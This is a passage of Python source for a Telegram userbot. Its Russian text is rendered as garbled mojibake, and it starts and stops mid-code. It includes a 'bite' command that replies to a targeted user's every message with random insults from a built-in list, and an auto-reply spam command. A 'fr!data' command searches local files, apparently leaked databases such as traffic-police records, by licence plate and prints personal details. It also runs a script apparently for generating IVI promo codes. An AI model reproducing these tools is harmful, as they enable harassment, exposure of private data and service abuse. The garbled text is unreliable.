        # –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏—á–µ—Å–∫–æ–º—É –±–æ—Ç—É
        async with client.conversation(STAT_BOT_USERNAME) as conv:
            await conv.send_message(query if is_id else f"@{query}")

            while True:
                try:
                    response = await conv.get_response(timeout=30)
                    if not ("‚è≥" in response.text or "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞" in response.text):
                        # –£–±–∏—Ä–∞–µ–º –∫–ª–∏–∫–∞–±–µ–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏
                        text = re.sub(r'https://', 'https ://', response.text)
                        text = re.sub(r't\.me/', 't. me/', text)
                        await event.respond(
                            f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –¥–ª—è {'ID' if is_id else '—é–∑–µ—Ä–Ω–µ–π–º–∞'}: {query}\n\n{text}"
                        )
                        break
                except asyncio.TimeoutError:
                    await event.respond("‚åõ –ë–æ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª –≤ —Ç–µ—á–µ–Ω–∏–µ 30 —Å–µ–∫—É–Ω–¥.")
                    break

    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

EDIT_COMMANDS = ['fr!edit', 'fr!e', 'fr!–µ', 'fr!—Ä–µ–¥']
DEL_COMMANDS = ['fr!del', 'fr!d', 'fr!–¥', 'fr!–¥–µ–ª']

# üìù –ö–æ–º–∞–Ω–¥–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
@client.on(events.NewMessage(outgoing=True, pattern=r'^(fr!(?:edit|e|–µ|—Ä–µ–¥)) (\d{1,2}) (.+)'))
async def handler_edit(event):
    try:
        count = int(event.pattern_match.group(2))
        new_text = event.pattern_match.group(3)

        async for msg in client.iter_messages(event.chat_id, from_user='me', limit=count + 1):
            if msg.id != event.id:
                await msg.edit(new_text)
        await event.delete()
    except Exception as e:
        await event.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏: {e}")

# –•—Ä–∞–Ω–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∞–≤—Ç–æ—Å–º—Å –∏ –±–∞–π—Ç–∞
auto_sms_targets = {}  # {chat_id: {user_id: text}}
bite_targets = {}      # {chat_id: set(user_id)}

insults = [
    "–¢—ã –≤–æ–æ–±—â–µ –ø–æ–Ω–∏–º–∞–µ—à—å —á—Ç–æ –ø–∏—à–µ—à—å –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –¥–µ–±–∏–ª",
    "–°–ª—É—à–∞–π —Ç–≤–æ–π –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç —è–≤–Ω–æ –Ω–∞ —É—Ä–æ–≤–Ω–µ —Ç–∞–ø–∫–∞",
    "–° –∫–∞–∂–¥—ã–º —Ç–≤–æ–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º –≤ —á–∞—Ç –æ–ø—É—Å–∫–∞–µ—Ç—Å—è –ø–ª–∞–Ω–∫–∞ –∫–∞—á–µ—Å—Ç–≤–∞",
    "–¢—ã —Å–ª–æ–≤–Ω–æ —Ö–æ–¥—è—á–∏–π –±–∞–≥ –≤ —ç—Ç–æ–π –±–µ—Å–µ–¥–µ –Ω–∞–¥–æ–µ–ª –≤—Å–µ–º",
    "–ï—Å–ª–∏ –±—ã –≥–ª—É–ø–æ—Å—Ç—å –±—ã–ª–∞ –ø—Ä–µ—Å—Ç—É–ø–ª–µ–Ω–∏–µ–º —Ç—ã –±—ã–ª –±—ã –ø–æ–∂–∏–∑–Ω–µ–Ω–Ω–æ",
    "–¢–≤–æ–∏ –º—ã—Å–ª–∏ –Ω–∞—Å—Ç–æ–ª—å–∫–æ —É–±–æ–≥–∏ —á—Ç–æ —Ö–æ—á–µ—Ç—Å—è –≤—ã–∫–ª—é—á–∏—Ç—å —Ç–µ–±—è –Ω–∞–≤—Å–µ–≥–¥–∞",
    "–¢—ã –Ω–∞—Å—Ç–æ–ª—å–∫–æ –∂–∞–ª–æ–∫ —á—Ç–æ –¥–∞–∂–µ –∫–æ—Ç—ã —Ç–µ–±—è –∏–≥–Ω–æ—Ä–∏—Ä—É—é—Ç",
    "–õ—É—á—à–µ –±—ã —Ç—ã –º–æ–ª—á–∞–ª —ç—Ç–æ –±—ã–ª–æ –±—ã –ø–æ–ª–µ–∑–Ω–µ–µ –¥–ª—è –≤—Å–µ—Ö",
    "–¢–≤–æ–π —É—Ä–æ–≤–µ–Ω—å –æ–±—â–µ–Ω–∏—è —ç—Ç–æ –æ—Å–∫–æ—Ä–±–ª–µ–Ω–∏–µ –∑–¥—Ä–∞–≤–æ–≥–æ —Å–º—ã—Å–ª–∞",
    "–£ —Ç–µ–±—è –º–æ–∑–≥ –∏–∑ –∫–µ—Ñ–∏—Ä–∞ –∫–æ—Ç–æ—Ä—ã–π —É–∂–µ –¥–∞–≤–Ω–æ –ø—Ä–æ–∫–∏—Å",
    "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –ø–µ—Ä–µ—Å—Ç–∞–Ω—å –ø–æ—Å—Ç–∏—Ç—å —Ç—ã —É–±–∏–≤–∞–µ—à—å –º–æ–µ –∂–µ–ª–∞–Ω–∏–µ –æ–±—â–∞—Ç—å—Å—è",
    "–í —Å–ª–µ–¥—É—é—â–∏–π —Ä–∞–∑ –∫–æ–≥–¥–∞ –∑–∞—Ö–æ—á–µ—à—å —á—Ç–æ —Ç–æ —Å–∫–∞–∑–∞—Ç—å —Å–Ω–∞—á–∞–ª–∞ –ø–æ–¥—É–º–∞–π –Ω–µ—Ç –Ω–µ –Ω–∞–¥–æ",
    "–¢—ã –ø—Ä–∏—á–∏–Ω–∞ –ø–æ—á–µ–º—É —É –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ª—é–¥–µ–π –ø—Ä–æ–ø–∞–¥–∞–µ—Ç –≤–µ—Ä–∞ –≤ —á–µ–ª–æ–≤–µ—á–µ—Å—Ç–≤–æ",
    "–¢–≤–æ–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤—ã–∑—ã–≤–∞—é—Ç —Ç–æ–ª—å–∫–æ —Å—Ç—ã–¥ –∑–∞ —á–µ–ª–æ–≤–µ—á–µ—Å—Ç–≤–æ",
    "–í—ã–π–¥–∏ –∏–∑ —á–∞—Ç–∞ –ø–æ–∫–∞ –Ω–µ —Å—Ç–∞–ª–æ —Ö—É–∂–µ",
    "–¢–µ–±—è –Ω–µ–ª—å–∑—è –≤–æ—Å–ø—Ä–∏–Ω–∏–º–∞—Ç—å –≤—Å–µ—Ä—å—ë–∑ —Ç—ã –ø—Ä–æ—Å—Ç–æ –ø–æ–º–µ—Ö–∞",
    "–¢—ã –∂–∏–≤–æ–µ –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ —Ç–æ–≥–æ —á—Ç–æ –∏–Ω—Ç–µ–ª–ª–µ–∫—Ç –Ω–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω –≥–µ–Ω–∞–º–∏",
    "–û—Ç —Ç–≤–æ–∏—Ö —Å–ª–æ–≤ —Ö–æ—á–µ—Ç—Å—è –≤—ã—Ä–≤–∞—Ç—å –≥–ª–∞–∑–∞ –∏ —É—à–∏",
    "–¢—ã –º–æ–≥ –±—ã –∑–∞—Ç–∫–Ω—É—Ç—å—Å—è –∏ —Å–¥–µ–ª–∞—Ç—å –º–∏—Ä –ª—É—á—à–µ –ø–æ–≤–µ—Ä—å",
    "–ö–∞–∂–¥–æ–µ —Ç–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –º–∞–ª–µ–Ω—å–∫–∞—è –∫–∞—Ç–∞—Å—Ç—Ä–æ—Ñ–∞ –¥–ª—è –º–µ–Ω—è"
]

def is_command(text, *cmds):
    text = text.lower()
    return any(text.startswith(c) for c in cmds)

@client.on(events.NewMessage(outgoing=True))
async def commands_handler(event):
    text = event.text
    chat_id = event.chat_id

    # fr!–∞–≤—Ç–æ—Å–º—Å [—Ç–µ–∫—Å—Ç], –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if is_command(text, "fr!–∞–≤—Ç–æ—Å–º—Å", "fr!autosms", "fr!–∞–≤—Ç–æ—Å–º—Å+", "fr!autosms+"):
        # –ö–æ–º–∞–Ω–¥–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç–≤–µ—Ç–æ–º –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∏–Ω–∞—á–µ –Ω–µ–ª—å–∑—è –ø–æ–Ω—è—Ç—å –∫–æ–≥–æ
        if not event.is_reply:
            await event.reply("‚ùóÔ∏è –û—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä–æ–º—É –≤–∫–ª—é—á–∏—Ç—å –∞–≤—Ç–æ—Å–º—Å")
            return

        # –ò–∑–≤–ª–µ–∫–∞–µ–º —Ç–µ–∫—Å—Ç –∫–æ–º–∞–Ω–¥—ã (–ø–æ—Å–ª–µ "fr!–∞–≤—Ç–æ—Å–º—Å")
        parts = text.split(' ', 1)
        if len(parts) < 2 or not parts[1].strip():
            await event.reply("‚ùóÔ∏è –£–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –∞–≤—Ç–æ—Å–º—Å, –Ω–∞–ø—Ä–∏–º–µ—Ä:\nfr!–∞–≤—Ç–æ—Å–º—Å –ü—Ä–∏–≤–µ—Ç")
            return
        reply_text = parts[1].strip()

        replied = await event.get_reply_message()
        user = await replied.get_sender()
        if not user:
            await event.reply("‚ùóÔ∏è –ù–µ –º–æ–≥—É –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ")
            return

        if chat_id not in auto_sms_targets:
            auto_sms_targets[chat_id] = {}
        auto_sms_targets[chat_id][user.id] = reply_text
        await event.reply(f"‚úÖ –ê–≤—Ç–æ—Å–º—Å –≤–∫–ª—é—á—ë–Ω –¥–ª—è [{user.first_name}](tg://user?id={user.id})")

    # fr!–∞–≤—Ç–æ—Å–º—Å—Å—Ç–æ–ø, –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –±–µ–∑ - –æ—Ç–∫–ª—é—á–∏—Ç—å
    elif is_command(text, "fr!–∞–≤—Ç–æ—Å–º—Å—Å—Ç–æ–ø", "fr!–∞–≤—Ç–æ—Å–º—Å-", "fr!autosms-"):
        if event.is_reply:
            replied = await event.get_reply_message()
            user = await replied.get_sender()
            if chat_id in auto_sms_targets and user.id in auto_sms_targets[chat_id]:
                del auto_sms_targets[chat_id][user.id]
                await event.reply(f"‚úÖ –ê–≤—Ç–æ—Å–º—Å –æ—Ç–∫–ª—é—á—ë–Ω –¥–ª—è [{user.first_name}](tg://user?id={user.id})")
            else:
                await event.reply("‚ùóÔ∏è –î–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∞–≤—Ç–æ—Å–º—Å –Ω–µ –≤–∫–ª—é—á—ë–Ω")
        else:
            # –ë–µ–∑ reply - –æ—Ç–∫–ª—é—á–∞–µ–º –≤—Å–µ –∞–≤—Ç–æ—Å–º—Å –≤ —á–∞—Ç–µ
            if chat_id in auto_sms_targets:
                auto_sms_targets.pop(chat_id)
                await event.reply("‚úÖ –ê–≤—Ç–æ—Å–º—Å –æ—Ç–∫–ª—é—á—ë–Ω –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ —ç—Ç–æ–º —á–∞—Ç–µ")
            else:
                await event.reply("‚ùóÔ∏è –í —ç—Ç–æ–º —á–∞—Ç–µ –Ω–µ—Ç –≤–∫–ª—é—á—ë–Ω–Ω—ã—Ö –∞–≤—Ç–æ—Å–º—Å")

    # fr!–±–∞–π—Ç - –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    elif is_command(text, "fr!–±–∞–π—Ç", "fr!bite"):
        if not event.is_reply:
            await event.reply("‚ùóÔ∏è –û—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å –±–∞–π—Ç")
            return

        replied = await event.get_reply_message()
        user = await replied.get_sender()
        if not user:
            await event.reply("‚ùóÔ∏è –ù–µ –º–æ–≥—É –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ")
            return

        if chat_id not in bite_targets:
            bite_targets[chat_id] = set()
        bite_targets[chat_id].add(user.id)
        await event.reply(f"üî• –ë–∞–π—Ç –≤–∫–ª—é—á—ë–Ω –¥–ª—è [{user.first_name}](tg://user?id={user.id})")

    # fr!–±–∞–π—Ç—Å—Ç–æ–ø - –≤ –æ—Ç–≤–µ—Ç –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –±–µ–∑
    elif is_command(text, "fr!–±–∞–π—Ç—Å—Ç–æ–ø", "fr!bite-", "fr!–±–∞–π—Ç-"):
        if event.is_reply:
            replied = await event.get_reply_message()
            user = await replied.get_sender()
            if chat_id in bite_targets and user.id in bite_targets[chat_id]:
                bite_targets[chat_id].remove(user.id)
                await event.reply(f"üõë –ë–∞–π—Ç –æ—Ç–∫–ª—é—á—ë–Ω –¥–ª—è [{user.first_name}](tg://user?id={user.id})")
            else:
                await event.reply("‚ùóÔ∏è –î–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –±–∞–π—Ç –Ω–µ –≤–∫–ª—é—á—ë–Ω")
        else:
            if chat_id in bite_targets:
                bite_targets.pop(chat_id)
                await event.reply("üõë –ë–∞–π—Ç –æ—Ç–∫–ª—é—á—ë–Ω –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ —ç—Ç–æ–º —á–∞—Ç–µ")
            else:
                await event.reply("‚ùóÔ∏è –í —ç—Ç–æ–º —á–∞—Ç–µ –Ω–µ—Ç –≤–∫–ª—é—á—ë–Ω–Ω–æ–≥–æ –±–∞–π—Ç–∞")

@client.on(events.NewMessage())
async def message_handler(event):
    if event.out:
        # –ù–µ —Ä–µ–∞–≥–∏—Ä—É–µ–º –Ω–∞ —Å–≤–æ–∏ —Å–æ–æ–±—â–µ–Ω–∏—è
        return
    chat_id = event.chat_id
    sender = await event.get_sender()
    if sender is None or sender.is_self:
        return
    user_id = sender.id

    # –ê–≤—Ç–æ—Å–º—Å
    if chat_id in auto_sms_targets and user_id in auto_sms_targets[chat_id]:
        await event.reply(auto_sms_targets[chat_id][user_id])

    # –ë–∞–π—Ç
    if chat_id in bite_targets and user_id in bite_targets[chat_id]:
        insult = random.choice(insults)
        await event.reply(insult)
        
from datetime import datetime, timedelta

# üßπ –ö–æ–º–∞–Ω–¥–∞ —É–¥–∞–ª–µ–Ω–∏—è
@client.on(events.NewMessage(outgoing=True, pattern=r'^(fr!(?:del|d|–¥|–¥–µ–ª)) (\d+)'))
async def handler_delete(event):
    try:
        count = int(event.pattern_match.group(2))
        deleted = 0
        cutoff = datetime.now(timezone.utc) - timedelta(days=7)  # –Ω–∞–ø—Ä–∏–º–µ—Ä, —É–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –Ω–µ —Å—Ç–∞—Ä—à–µ 7 –¥–Ω–µ–π
        messages_to_delete = []

        async for msg in client.iter_messages(event.chat_id, from_user='me', limit=count * 2):
            # –§–∏–ª—å—Ç—Ä –ø–æ –¥–∞—Ç–µ (–º–æ–∂–µ—à—å —É–±—Ä–∞—Ç—å –∏–ª–∏ –ø–æ–º–µ–Ω—è—Ç—å)
            if msg.date < cutoff:
                continue
            messages_to_delete.append(msg)
            if len(messages_to_delete) >= count:
                break

        if not messages_to_delete:
            await event.respond("–ù–µ –Ω–∞–π–¥–µ–Ω–æ –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è.")
            return

        # –£–¥–∞–ª—è–µ–º –ø–æ –æ–¥–Ω–æ–º—É —Å –Ω–µ–±–æ–ª—å—à–æ–π –∑–∞–¥–µ—Ä–∂–∫–æ–π (–º–æ–∂–Ω–æ —É–±—Ä–∞—Ç—å –∑–∞–¥–µ—Ä–∂–∫—É –µ—Å–ª–∏ —Ö–æ—á–µ—à—å)
        for msg in messages_to_delete:
            try:
                await client.delete_messages(event.chat_id, msg)
                deleted += 1
                await asyncio.sleep(0.1)  # –ø–∞—É–∑–∞, —á—Ç–æ–±—ã –Ω–µ –ø–µ—Ä–µ–≥—Ä—É–∑–∏—Ç—å API
            except Exception as e:
                await event.reply(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ {msg.id}: {e}")

        await event.respond(f"–£–¥–∞–ª–µ–Ω–æ {deleted} —Å–æ–æ–±—â–µ–Ω–∏–π.")
    except Exception as e:
        await event.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏: {e}")
        
from telethon.tl.functions.users import GetFullUserRequest

async def get_name(client, user_id):
    try:
        entity = await client.get_entity(int(user_id))
        if hasattr(entity, 'first_name') and entity.first_name:
            # –°–æ–±–∏—Ä–∞–µ–º –∏–º—è –∏ —Ñ–∞–º–∏–ª–∏—é (–µ—Å–ª–∏ –µ—Å—Ç—å)
            first = entity.first_name or ""
            last = getattr(entity, 'last_name', "") or ""
            full_name = (first + " " + last).strip()
            return full_name if full_name else str(user_id)
        elif hasattr(entity, 'title'):
            # –î–ª—è –∫–∞–Ω–∞–ª–æ–≤/—á–∞—Ç–æ–≤
            return entity.title
        else:
            return str(user_id)
    except Exception:
        return str(user_id)


@client.on(events.NewMessage(pattern=r'^fr!vipcheck(?: (\d+))?$'))
async def vipcheck(event):
    arg = event.pattern_match.group(1)
    sender_uid = str(event.sender_id)
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"

    if arg and sender_uid == str(OWNER_USER_ID):
        uid_to_check = arg
    else:
        uid_to_check = sender_uid

    async def get_name(user_id):
        try:
            entity = await client.get_entity(int(user_id))
            if hasattr(entity, 'first_name'):
                first = entity.first_name or ""
                last = getattr(entity, 'last_name', "") or ""
                return (first + " " + last).strip() or str(user_id)
            elif hasattr(entity, 'title'):
                return entity.title
            else:
                return str(user_id)
        except:
            return str(user_id)

    try:
        sender_name = await get_name(sender_uid)
        host_name = await get_name(OWNER_USER_ID)
        check_name = await get_name(uid_to_check)

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await event.respond("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ª–∏—Ü–µ–Ω–∑–∏–π.")
                    return

                encrypted_bytes = await resp.read()
                decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                data = decrypted_text

                def user_status(uid):
                    is_admin = uid in data.get("admins", {}) and data["admins"][uid]
                    is_vip = uid in data.get("vip", {})
                    if is_admin and is_vip:
                        return "üíº –ê–¥–º–∏–Ω + üíé VIP"
                    elif is_admin:
                        return "üíº –ê–¥–º–∏–Ω"
                    elif is_vip:
                        return f"üíé VIP –¥–æ `{data['vip'][uid]}`"
                    else:
                        return "üö´ –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ (VIP/ADMIN)"

                msg = (
                    f"üë§ –ó–∞–ø—Ä–æ—Å –æ—Ç: `{sender_name}` (`{sender_uid}`)\n\n"
                    f"üè† –•–æ—Å—Ç: `{host_name}` (`{OWNER_USER_ID}`) ‚Äî {user_status(str(OWNER_USER_ID))}\n\n"
                    f"üîç –ü—Ä–æ–≤–µ—Ä—è–µ–º—ã–π: `{check_name}` (`{uid_to_check}`) ‚Äî {user_status(str(uid_to_check))}"
                )
                await event.respond(msg, parse_mode='markdown')

    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ VIP/ADMIN: `{e}`", parse_mode='markdown')


# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    filename='promoivi.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promoivi$'))
@owner_only
@vip_only
async def run_promo_script(event):
    try:
        await event.respond("üöÄ –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ü–∏—é –ø—Ä–æ–º–æ–∫–æ–¥–∞ IVI...")

        script_path = os.path.join(os.getcwd(), 'addons', 'ivi.py')
        if not os.path.exists(script_path):
            await event.respond("‚ùå –§–∞–π–ª ivi.py –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ø–∞–ø–∫–µ addons.")
            logging.error("–§–∞–π–ª ivi.py –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'ivi.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # –ß—Ç–µ–Ω–∏–µ STDOUT
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # –ß—Ç–µ–Ω–∏–µ STDERR
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("‚úÖ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø—Ä–æ–º–æ–∫–æ–¥–∞ IVI –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        logging.info("–°–∫—Ä–∏–ø—Ç ivi.py –∑–∞–≤–µ—Ä—à–∏–ª –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.")

    except Exception as e:
        msg = f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞: {e}"
        await event.respond(msg)
        logging.exception("–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã fr!promoivi")
       
@client.on(events.NewMessage(pattern=r'fr!license'))
async def license(event):
    license_message = (
        f"‚úÖ –õ–∏—Ü–µ–Ω–∑–∏—è –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–∞ FENST4R –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.\n"
        f"–î–ª—è –ø–µ—Ä–µ–ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–ø–∏—à–∏—Ç–µ @error_kill.\n"
        f"ID —é–∑–µ—Ä–∞-—Ö–æ—Å—Ç–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏: `{OWNER_USER_ID}`"
    )
    await event.respond(license_message)

import os
from telethon import events

@client.on(events.NewMessage(pattern=r'fr!data(?:\s+(\S+))?(?:\s+(.+))?'))
async def data_message(event):
    filename = event.pattern_match.group(1)
    keyword = event.pattern_match.group(2)

    usage = "‚ùó –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã:\n" \
            "`fr!data <–∏–º—è_—Ñ–∞–π–ª–∞|all> <—á—Ç–æ_–∏—Å–∫–∞—Ç—å>`\n" \
            "–°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –¥–∞—Ç–∞–±–∞–∑: `fr!databases`\n" \
            "–ü—Ä–∏–º–µ—Ä:\n" \
            "`fr!data gibdd.txt ABC1234`\n" \
            "`fr!data all ABC1234`\n" \

    if not filename or not keyword:
        await event.respond(usage)
        return

    if filename != 'all':
        # –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å: –∑–∞–ø—Ä–µ—â–∞–µ–º ../ –∏ —Å–ª—ç—à–∏ –≤ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞
        if '..' in filename or '/' in filename or '\\' in filename:
            await event.respond("‚ùå –ù–µ–¥–æ–ø—É—Å—Ç–∏–º–æ–µ –∏–º—è —Ñ–∞–π–ª–∞")
            return

    keyword = keyword.upper()
    found = False
    results = []

    base_dir = os.path.join(os.path.dirname(__file__), 'databases')

    if filename == 'all':
        # –ü—Ä–æ—Ö–æ–¥–∏–º –ø–æ –≤—Å–µ–º —Ñ–∞–π–ª–∞–º –≤ –ø–∞–ø–∫–µ databases
        try:
            files = [f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]
        except Exception:
            await event.respond("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö")
            return

        for fname in files:
            file_path = os.path.join(base_dir, fname)
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    headers = file.readline().strip().split(',')
                    for line in file:
                        if keyword in line.upper():
                            found = True
                            data = line.strip().split(',')
                            message = f"üîç –ù–∞–π–¥–µ–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –≤ —Ñ–∞–π–ª–µ `{fname}` –ø–æ –∑–∞–ø—Ä–æ—Å—É:\n**{keyword}**\n\n"
                            for header, value in zip(headers, data):
                                if header.strip() and value.strip():
                                    message += f"‚ñ™ **{header.strip()}:** {value.strip()}\n"
                            results.append(message)
            except Exception:
                # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Ñ–∞–π–ª—ã, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å
                continue

    else:
        # –ü–æ–∏—Å–∫ –≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º —Ñ–∞–π–ª–µ
        file_path = os.path.join(base_dir, filename)
        if not os.path.exists(file_path):
            await event.respond(f"‚ùå –§–∞–π–ª `{filename}` –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö")
            return

        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                headers = file.readline().strip().split(',')
                for line in file:
                    if keyword in line.upper():
                        found = True
                        data = line.strip().split(',')
                        message = f"üîç –ù–∞–π–¥–µ–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ –∑–∞–ø—Ä–æ—Å—É:\n**{keyword}**\n\n"
                        for header, value in zip(headers, data):
                            if header.strip() and value.strip():
                                message += f"‚ñ™ **{header.strip()}:** {value.strip()}\n"
                        results.append(message)
        except Exception:
            await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ `{filename}`")
            return

    if not found:
        await event.respond(f"‚ùå –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ –∑–∞–ø—Ä–æ—Å—É `{keyword}` –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
    else:
        for msg in results:
            try:
                await event.respond(msg)
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")


@client.on(events.NewMessage(pattern=r'fr!databases'))
async def databases_list(event):
    base_dir = os.path.join(os.path.dirname(__file__), 'databases')

    try:
        files = [f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))]
    except Exception:
